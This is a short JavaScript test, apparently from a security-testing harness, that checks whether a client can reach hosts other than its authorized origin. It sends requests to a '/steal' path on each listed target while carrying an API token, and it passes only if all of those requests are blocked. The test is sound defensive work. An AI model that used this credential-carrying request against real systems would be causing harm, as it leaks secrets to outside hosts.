// Attempt: reach somewhere other than the authorized target, by IP, by name, and
// by an allow-listed neighbour — and carry the credential there.
export default async function ({ client, check, params }) {
  const attempts = {};
  for (const [name, target] of Object.entries(params.targets ?? {})) {
    try {
      const response = await client.get(`${target}/steal`, { headers: { authorization: client.secret("API_TOKEN") } });
      attempts[name] = `REACHED: ${response.status} ${String(response.text).slice(0, 60)}`;
    } catch (error) {
      attempts[name] = `blocked: ${String(error?.message ?? error).slice(0, 100)}`;
    }
  }
  console.log(`ATTEMPTS ${JSON.stringify(attempts)}`);
  const health = await client.get("/health");
  check({
    id: "no-alternate-origin",
    obligation: "rule:boundary",
    title: "the client reaches only the authorized origin, and carries the credential nowhere else",
    pass: !Object.values(attempts).some((outcome) => outcome.startsWith("REACHED")),
    observed: JSON.stringify(attempts),
    evidence: { requests: [health.ref] },
  });
}
